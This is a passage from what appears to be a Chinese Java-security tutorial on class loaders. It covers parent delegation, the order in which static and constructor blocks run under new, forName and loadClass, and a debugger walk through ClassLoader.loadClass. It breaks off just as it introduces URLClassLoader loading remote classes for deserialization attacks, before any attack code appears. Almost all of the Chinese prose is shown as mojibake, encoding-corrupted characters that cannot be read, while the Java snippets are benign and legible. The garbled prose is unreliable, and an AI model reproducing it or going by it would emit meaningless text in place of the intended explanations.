APPã€‚å¦‚æœ BOOT å½“ä¸­æ²¡æœ‰ï¼Œå°±å» EXC é‡Œé¢æ‰¾ï¼Œå¦‚æœ EXC é‡Œé¢æ²¡æœ‰ï¼Œå°±å» APP é‡Œé¢æ‰¾ã€‚</p><ul><li>æˆ‘ä»¬ä¹‹å‰æŠ¥é”™çš„ç¨‹åºå½“ä¸­ï¼Œå®šä¹‰çš„ <code>java.lang.String</code> åœ¨ BOOT å½“ä¸­æ˜¯æœ‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è‡ªå®šä¹‰ String æ—¶ï¼Œä¼šæŠ¥é”™ï¼Œå¦‚æœè¦ä¿®æ”¹çš„è¯ï¼Œæ˜¯éœ€è¦å» rt.jar é‡Œé¢ä¿®æ”¹çš„ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ã€‚</li></ul><h4 id="ä»æ­£ç¡®çš„è§’åº¦æ„Ÿå—åŒäº²å§”æ´¾æœºåˆ¶"><a href="#ä»æ­£ç¡®çš„è§’åº¦æ„Ÿå—åŒäº²å§”æ´¾æœºåˆ¶" class="headerlink" title="ä»æ­£ç¡®çš„è§’åº¦æ„Ÿå—åŒäº²å§”æ´¾æœºåˆ¶"></a>ä»æ­£ç¡®çš„è§’åº¦æ„Ÿå—åŒäº²å§”æ´¾æœºåˆ¶</h4><p>å‰æ–‡æåˆ°æˆ‘ä»¬æ–°å»ºçš„ <code>java.lang.String</code> æŠ¥é”™äº†ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬å®šä¹‰çš„ String å’Œ BOOT åŒ…ä¸‹é¢çš„ String å†²çªäº†ï¼Œæ‰€ä»¥æ‰ä¼šæŠ¥é”™ï¼Œæˆ‘ä»¬è¿™é‡Œå®šä¹‰ä¸€ä¸ª BOOT å’Œ EXC éƒ½æ²¡æœ‰çš„å¯¹è±¡è¯•ä¸€è¯•ã€‚</p><p><strong>åœ¨å…¶ä»–çš„</strong> æ–‡ä»¶å¤¹ä¸‹ï¼Œæ–°å»º <strong>Student.java</strong></p><p><strong>Student.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// åŒäº²å§”æ´¾çš„æ­£ç¡®ä»£ç   </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;  <br>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello&quot;</span>;  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();  <br><span class="hljs-comment">//åˆ©ç”¨åå°„æ‰“å°å‡ºåŠ è½½å™¨  </span><br> System.out.println(student.getClass().getClassLoader());  <br> System.out.println(student.toString());  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a31.png"></p><p>å¯ä»¥çœ‹åˆ°æ­¤æ—¶è°ƒç”¨çš„æ˜¯Appç±»åŠ è½½å™¨</p><h2 id="å„åœºæ™¯ä¸‹ä»£ç å—åŠ è½½é¡ºåº"><a href="#å„åœºæ™¯ä¸‹ä»£ç å—åŠ è½½é¡ºåº" class="headerlink" title="å„åœºæ™¯ä¸‹ä»£ç å—åŠ è½½é¡ºåº"></a>å„åœºæ™¯ä¸‹ä»£ç å—åŠ è½½é¡ºåº</h2><ul><li>è¿™é‡Œçš„ä»£ç å—ä¸»è¦æŒ‡çš„æ˜¯è¿™å››ç§<ul><li>é™æ€ä»£ç å—ï¼š<code>static&#123;&#125;</code></li><li>æ„é€ ä»£ç å—ï¼š<code>&#123;&#125;</code></li><li>æ— å‚æ„é€ å™¨ï¼š<code>ClassName()</code></li><li>æœ‰å‚æ„é€ å™¨ï¼š<code>ClassName(String name)</code></li></ul></li></ul><h3 id="åœºæ™¯ä¸€ã€å®ä¾‹åŒ–å¯¹è±¡"><a href="#åœºæ™¯ä¸€ã€å®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="åœºæ™¯ä¸€ã€å®ä¾‹åŒ–å¯¹è±¡"></a>åœºæ™¯ä¸€ã€å®ä¾‹åŒ–å¯¹è±¡</h3><p>è¿™é‡Œæœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«ä»‹ç»ä¸€ä¸‹ç”¨é€”ï¼š</p><ul><li><code>Person.java</code>ï¼šä¸€ä¸ªæ™®æ™®é€šé€šçš„ç±»ï¼Œé‡Œé¢æœ‰é™æ€ä»£ç å—ã€æ„é€ ä»£ç å—ã€æ— å‚æ„é€ å™¨ã€æœ‰å‚æ„é€ å™¨ã€é™æ€æˆå‘˜å˜é‡ã€æ™®é€šæˆå‘˜å˜é‡ã€é™æ€æ–¹æ³•ã€‚</li><li><code>Main.java</code>ï¼šå¯åŠ¨ç±»</li></ul><p><strong>Person.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// å­˜æ”¾ä»£ç å—  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> staticVar;  <br> <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> instanceVar;  <br>  <br> <span class="hljs-keyword">static</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;é™æ€ä»£ç å—&quot;</span>);  <br> &#125;  <br>  <br>    &#123;  <br>        System.out.println(<span class="hljs-string">&quot;æ„é€ ä»£ç å—&quot;</span>);  <br> &#125;  <br>  <br>    Person()&#123;  <br>        System.out.println(<span class="hljs-string">&quot;æ— å‚æ„é€ å™¨&quot;</span>);  <br> &#125;  <br>    Person(<span class="hljs-type">int</span> instanceVar)&#123;  <br>        System.out.println(<span class="hljs-string">&quot;æœ‰å‚æ„é€ å™¨&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">staticAction</span><span class="hljs-params">()</span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;é™æ€æ–¹æ³•&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Main.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// ä»£ç å—çš„å¯åŠ¨å™¨  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>ç»“è®ºï¼š</strong></li></ul><p>é€šè¿‡ <code>new</code> å…³é”®å­—å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œå…ˆè°ƒç”¨<strong>é™æ€ä»£ç å—</strong>ï¼Œç„¶åè°ƒç”¨<strong>æ„é€ ä»£ç å—</strong>ï¼Œæœ€åæ ¹æ®å®ä¾‹åŒ–æ–¹å¼ä¸åŒ(å¯¹åº”å‚æ•°åˆ—è¡¨ä¸åŒ)ï¼Œè°ƒç”¨ä¸åŒçš„æ„é€ å™¨ã€‚</p><h3 id="åœºæ™¯äºŒã€è°ƒç”¨é™æ€æ–¹æ³•"><a href="#åœºæ™¯äºŒã€è°ƒç”¨é™æ€æ–¹æ³•" class="headerlink" title="åœºæ™¯äºŒã€è°ƒç”¨é™æ€æ–¹æ³•"></a>åœºæ™¯äºŒã€è°ƒç”¨é™æ€æ–¹æ³•</h3><p>ç›´æ¥è°ƒç”¨ç±»çš„é™æ€æ–¹æ³•</p><p>Person.java ä¸å˜ï¼Œä¿®æ”¹ Main.java å¯åŠ¨å™¨å³å¯ã€‚</p><p><strong>Main.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// ä»£ç å—çš„å¯åŠ¨å™¨  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        Person.staticAction();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>ç»“è®ºï¼š</strong></li></ul><p>ä¸å®ä¾‹åŒ–å¯¹è±¡ç›´æ¥è°ƒç”¨é™æ€æ–¹æ³•ï¼Œä¼šå…ˆè°ƒç”¨ç±»ä¸­çš„<strong>é™æ€ä»£ç å—</strong>ï¼Œç„¶åè°ƒç”¨<strong>é™æ€æ–¹æ³•</strong></p><h3 id="åœºæ™¯ä¸‰ã€å¯¹ç±»ä¸­çš„é™æ€æˆå‘˜å˜é‡èµ‹å€¼"><a href="#åœºæ™¯ä¸‰ã€å¯¹ç±»ä¸­çš„é™æ€æˆå‘˜å˜é‡èµ‹å€¼" class="headerlink" title="åœºæ™¯ä¸‰ã€å¯¹ç±»ä¸­çš„é™æ€æˆå‘˜å˜é‡èµ‹å€¼"></a>åœºæ™¯ä¸‰ã€å¯¹ç±»ä¸­çš„é™æ€æˆå‘˜å˜é‡èµ‹å€¼</h3><p><strong>Main.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// ä»£ç å—çš„å¯åŠ¨å™¨  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br> Person.staticVar = <span class="hljs-number">1</span>;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>ç»“è®ºï¼š</strong></li></ul><p>åœ¨å¯¹é™æ€æˆå‘˜å˜é‡èµ‹å€¼å‰ï¼Œä¼šè°ƒç”¨<strong>é™æ€ä»£ç å—</strong></p><h3 id="åœºæ™¯å››ã€ä½¿ç”¨-class-è·å–ç±»"><a href="#åœºæ™¯å››ã€ä½¿ç”¨-class-è·å–ç±»" class="headerlink" title="åœºæ™¯å››ã€ä½¿ç”¨ class è·å–ç±»"></a>åœºæ™¯å››ã€ä½¿ç”¨ class è·å–ç±»</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// ä»£ç å—çš„å¯åŠ¨å™¨  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Person.class;  <br> &#125;  <br>&#125;<br><br><span class="hljs-comment">// æ— è¾“å‡º</span><br></code></pre></td></tr></table></figure><ul><li><strong>ç»“è®ºï¼š</strong></li></ul><p>åˆ©ç”¨ <code>class</code> å…³é”®å­—è·å–ç±»ï¼Œå¹¶ä¸ä¼šåŠ è½½ç±»ï¼Œä¹Ÿå°±æ˜¯ä»€ä¹ˆä¹Ÿä¸ä¼šè¾“å‡ºã€‚</p><h3 id="åœºæ™¯äº”ã€ä½¿ç”¨-forName-è·å–ç±»"><a href="#åœºæ™¯äº”ã€ä½¿ç”¨-forName-è·å–ç±»" class="headerlink" title="åœºæ™¯äº”ã€ä½¿ç”¨ forName è·å–ç±»"></a>åœºæ™¯äº”ã€ä½¿ç”¨ forName è·å–ç±»</h3><ul><li>è¿™é‡Œè¦æŠ›å‡ºå¼‚å¸¸ä¸€ä¸‹ã€‚</li></ul><p>æˆ‘ä»¬å†™ä¸‰ç§ <code>forName</code> çš„æ–¹æ³•è°ƒç”¨ã€‚<br>ä¿®æ”¹ <strong>Main.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// ä»£ç å—çš„å¯åŠ¨å™¨  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException&#123;  <br> Class.forName(<span class="hljs-string">&quot;src.DynamicClassLoader.Person&quot;</span>);<br> &#125;  <br>&#125;<br><span class="hljs-comment">// é™æ€ä»£ç å—</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// ä»£ç å—çš„å¯åŠ¨å™¨  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException&#123;   <br> Class.forName(<span class="hljs-string">&quot;src.DynamicClassLoader.Person&quot;</span>, <span class="hljs-literal">true</span>, ClassLoader.getSystemClassLoader());  <br> &#125;  <br>&#125;<br><span class="hljs-comment">// é™æ€ä»£ç å—</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// ä»£ç å—çš„å¯åŠ¨å™¨  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException&#123;   <br> Class.forName(<span class="hljs-string">&quot;src.DynamicClassLoader.Person&quot;</span>, <span class="hljs-literal">false</span>, ClassLoader.getSystemClassLoader());<br> &#125;  <br>&#125;<br><span class="hljs-comment">//æ²¡æœ‰è¾“å‡º</span><br></code></pre></td></tr></table></figure><ul><li><strong>ç»“è®ºï¼š</strong></li></ul><p><code>Class.forName(className)</code>å’Œ<code>Class.forName(className, true, ClassLoader.getSystemClassLoader())</code>ç­‰ä»·ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•éƒ½ä¼šè°ƒç”¨ç±»ä¸­çš„<strong>é™æ€ä»£ç å—</strong>ï¼Œå¦‚æœå°†ç¬¬äºŒä¸ªå‚æ•°è®¾ç½®ä¸º<code>false</code>ï¼Œé‚£ä¹ˆå°±ä¸ä¼šè°ƒç”¨<strong>é™æ€ä»£ç å—</strong></p><p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯initializeï¼Œæ§åˆ¶ç±»çš„åˆå§‹åŒ–ã€‚åˆå§‹åŒ–ç±»å°±ä¼šæ‰§è¡Œé™æ€ä»£ç å—</p><h3 id="åœºæ™¯å…­ã€ä½¿ç”¨-ClassLoader-loadClass-è·å–ç±»"><a href="#åœºæ™¯å…­ã€ä½¿ç”¨-ClassLoader-loadClass-è·å–ç±»" class="headerlink" title="åœºæ™¯å…­ã€ä½¿ç”¨ ClassLoader.loadClass() è·å–ç±»"></a>åœºæ™¯å…­ã€ä½¿ç”¨ ClassLoader.loadClass() è·å–ç±»</h3><p><strong>Main.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;     <br>        ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;src.DynamicClassLoader.Person&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//æ²¡æœ‰è¾“å‡º</span><br></code></pre></td></tr></table></figure><ul><li><strong>ç»“è®ºï¼š</strong></li></ul><p><code>ClassLoader.loadClass()</code>æ–¹æ³•åªåŠ è½½ï¼Œä¸åˆå§‹åŒ–ï¼Œå½“ç„¶ï¼Œå¦‚æœåé¢å†ä½¿ç”¨<code>newInstance()</code>è¿›è¡Œåˆå§‹åŒ–ï¼Œé‚£ä¹ˆä¼šå’Œ<code>åœºæ™¯ä¸€ã€å®ä¾‹åŒ–å¯¹è±¡</code>ä¸€æ ·çš„é¡ºåºåŠ è½½å¯¹åº”çš„ä»£ç å—ã€‚</p><h2 id="åŠ¨æ€åŠ è½½å­—èŠ‚ç "><a href="#åŠ¨æ€åŠ è½½å­—èŠ‚ç " class="headerlink" title="åŠ¨æ€åŠ è½½å­—èŠ‚ç "></a>åŠ¨æ€åŠ è½½å­—èŠ‚ç </h2><h3 id="å­—èŠ‚ç çš„æ¦‚å¿µ"><a href="#å­—èŠ‚ç çš„æ¦‚å¿µ" class="headerlink" title="å­—èŠ‚ç çš„æ¦‚å¿µ"></a>å­—èŠ‚ç çš„æ¦‚å¿µ</h3><p>ä»€ä¹ˆæ˜¯å­—èŠ‚ç ï¼Ÿ</p><blockquote><p>ä¸¥æ ¼æ¥è¯´ï¼ŒJava å­—èŠ‚ç ï¼ˆByteCodeï¼‰å…¶å®ä»…ä»…æŒ‡çš„æ˜¯ Java è™šæ‹Ÿæœºæ‰§è¡Œä½¿ç”¨çš„ä¸€ç±»æŒ‡ä»¤ï¼Œé€šå¸¸è¢«å­˜å‚¨åœ¨ .class æ–‡ä»¶ä¸­ã€‚</p></blockquote><p>è€Œå­—èŠ‚ç çš„è¯ç”Ÿæ˜¯ä¸ºäº†è®© JVM çš„æµé€šæ€§æ›´å¼ºï¼Œè¿™æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿçœ‹å›¾ä¾¿çŸ¥ã€‚</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a32.png"></p><p><strong>å­—èŠ‚ç æ˜¯ä¸­é—´å±‚</strong>ï¼šå±è”½äº†ä¸åŒè¯­è¨€å’Œä¸åŒæ“ä½œç³»ç»Ÿçš„å·®å¼‚ã€‚</p><p><strong>JVM æ˜¯æ‰§è¡Œå¼•æ“</strong>ï¼šå®ƒåªè¦èƒ½è¯»æ‡‚å­—èŠ‚ç ï¼Œå°±èƒ½è·‘åœ¨ Windowsã€Linuxã€Macã€ç”šè‡³æ‰‹æœºï¼ˆAndroidï¼‰ä¸Šã€‚</p><p>å› ä¸ºè¿™ç§æ¨¡å¼ï¼ŒJVM ä¸ä»…èƒ½è·‘ Javaï¼Œè¿˜èƒ½è·‘ Kotlinã€Scalaã€Groovy ç­‰ä¸€å¤§å †è¯­è¨€ â†’ <strong>JVM å˜æˆäº†ä¸€ä¸ªâ€œå¤šè¯­è¨€è¿è¡Œå¹³å°â€</strong>ã€‚</p><h3 id="ç±»åŠ è½½å™¨çš„åŸç†"><a href="#ç±»åŠ è½½å™¨çš„åŸç†" class="headerlink" title="ç±»åŠ è½½å™¨çš„åŸç†"></a>ç±»åŠ è½½å™¨çš„åŸç†</h3><p>æ ¹æ®å‰é¢å„åœºæ™¯ä¸‹ä»£ç å—çš„åŠ è½½é¡ºåºæˆ‘ä»¬å¾—çŸ¥ï¼Œåœ¨ loadClass() æ–¹æ³•è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œæ˜¯ä¸è¿›è¡Œç±»çš„åˆå§‹åŒ–çš„ã€‚</p><p>ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();  <br>c.loadClass(<span class="hljs-string">&quot;BasiClassLoader.Person&quot;</span>);<br></code></pre></td></tr></table></figure><p>æ‰“ä¸€ä¸‹æ–­ç‚¹ï¼Œè°ƒè¯•ä¸€ä¸‹ï¼Œæ–­ç‚¹æ‰“åœ¨ <code>ClassLoader.loadClass()</code> çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯çˆ¶ç±»ã€‚ä¸ºä»€ä¹ˆè¿™ä¹ˆæ‰“æ–­ç‚¹æ˜¯æœ‰åŸå› çš„ï¼Œå› ä¸ºæœ€å¼€å§‹æˆ‘ä»¬å·²çŸ¥ â€œPersonâ€ ç±»å®ƒæ˜¯ <code>Launcher@APPClassLoader</code>ï¼Œå®ƒé‡Œé¢æ˜¯æœ‰ä¸€ä¸ª <code>loadClass()</code> æ–¹æ³•çš„ï¼Œä½†æ˜¯å®ƒåªæœ‰ä¸€ä¸ªå‚æ•°ã€‚æ‰€ä»¥æ–­ç‚¹ä¸‹åœ¨ <code>ClassLoader.loadClass()</code> ä¹‹ç±»</p><p>å¼€å§‹è°ƒè¯•</p><p>è°ƒè¯•å…ˆä¼šèµ°åˆ° <code>ClassLoader.loadClass()</code>ï¼Œè¿™é‡Œå…¶å® return å°±å¤šç»™äº†ä¸€ä¸ªå‚æ•°ä¸º falseï¼›æˆ‘ä»¬ ctrl + f7 è·Ÿè¿›ã€‚åˆä¼šå›åˆ° <code>Launcher@APPClassLoader</code> è¿™é‡Œã€‚</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a33.png"></p><p>è€Œåœ¨ <code>java.lang.ClassLoader</code> ä¸­ï¼Œ<code>loadClass</code> æ–¹æ³•çš„å®šä¹‰æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="hljs-type">boolean</span> resolve) <span class="hljs-keyword">throws</span> ClassNotFoundException<br></code></pre></td></tr></table></figure><p><code>resolve</code>ï¼ˆå¸ƒå°”å€¼ï¼Œå¯é€‰ï¼‰<br> æ˜¯å¦åœ¨åŠ è½½å**ç«‹å³è§£æï¼ˆlink&#x2F;resolveï¼‰**ç±»ã€‚</p><ul><li><code>false</code>ï¼šåªåŠ è½½ç±»ï¼Œä½†ä¸è§£æã€‚</li><li><code>true</code>ï¼šåŠ è½½åç«‹åˆ»è§£æã€‚</li></ul><p>è¿™é‡Œreturn falseï¼Œæ‰€ä»¥ç±»ä¸ä¼šåˆå§‹åŒ–</p><p>ç»§ç»­è·Ÿè¿›</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a34.png"></p><p>è¿™é‡Œ null æ˜¯å› ä¸ºæœ€ä¸Šé¢çš„ Bootstrap ç±»æ˜¯ native ç±»ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰è¯´è¿‡çš„ C å†™çš„æºç ï¼Œæ‰€ä»¥ä¸º nullã€‚</p><p>ç»§ç»­å¾€ä¸‹èµ°ï¼Œå› ä¸º APP å’Œ Ext çš„çˆ¶ç±»æ˜¯ URLClassLoaderï¼Œæ‰€ä»¥è¿™é‡Œçš„ findClass() æ˜¯ä¼šå»æ‰¾åˆ° URLClassLoader çš„ã€‚</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a35.png"></p><p>æ¥ç€åœ¨ URLClassLoader é‡Œé¢è°ƒç”¨äº† defineClass æ–¹æ³•ï¼Œå†ä¸€æ­¥æ­¥è·Ÿè¿›å°±æ˜¯æˆ‘ä»¬çš„ native æ–¹æ³•(åœ¨ JVM å†…éƒ¨åšçš„äº‹æƒ…ï¼šå­—èŠ‚ç éªŒè¯ï¼Œç”Ÿæˆ JVM å†…éƒ¨æ•°æ®ç»“æ„ï¼ˆKlassï¼‰ï¼Œé“¾æ¥ï¼ˆéªŒè¯ + å‡†å¤‡ + è§£æï¼‰ï¼Œå­˜å…¥æ–¹æ³•åŒº&#x2F;å…ƒç©ºé—´)</p><p>æ€»çš„æµç¨‹:<br>ClassLoader â€”-&gt; SecureClassLoader â€”&gt; URLClassLoader â€”-&gt; APPClassLoader â€”-&gt; loadClass() â€”-&gt; findClass()</p><p>ä¸‹é¢æˆ‘ä»¬ä»‹ç»å¤šç§èƒ½å¤Ÿç”¨äºååºåˆ—åŒ–æ”»å‡»çš„ï¼ŒåŠ è½½å­—èŠ‚ç çš„ç±»åŠ è½½å™¨ã€‚</p><h3 id="åˆ©ç”¨-URLClassLoader-åŠ è½½è¿œç¨‹-class-æ–‡ä»¶"><a href="#åˆ©ç”¨-URLClassLoader-åŠ è½½è¿œç¨‹-class-æ–‡ä»¶" class="headerlink" title="åˆ©ç”¨ URLClassLoader åŠ è½½è¿œç¨‹ class æ–‡ä»¶"></a>åˆ©ç”¨ URLClassLoader åŠ è½½è¿œç¨‹ class æ–‡ä»¶</h3><p><code>URLClassLoader</code> å®é™…ä¸Šæ˜¯æˆ‘ä»¬å¹³æ—¶é»˜è®¤ä½¿ç”¨çš„ <code>AppClassLoader</code> çš„çˆ¶ç±»ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬è§£é‡Š <code>URLClassLoader</code> çš„å·¥ä½œè¿‡ç¨‹å®é™…ä¸Šå°±æ˜¯åœ¨è§£é‡Šé»˜è®¤çš„ <code>Java </code>ç±»åŠ è½½å™¨çš„å·¥ä½œæµç¨‹ã€‚</p><p>æ­£å¸¸æƒ…å†µä¸‹ï¼ŒJavaä¼šæ ¹æ®é…ç½®é¡¹ <code>sun.boot.class.path</code> å’Œ <code>java.class.path</code> 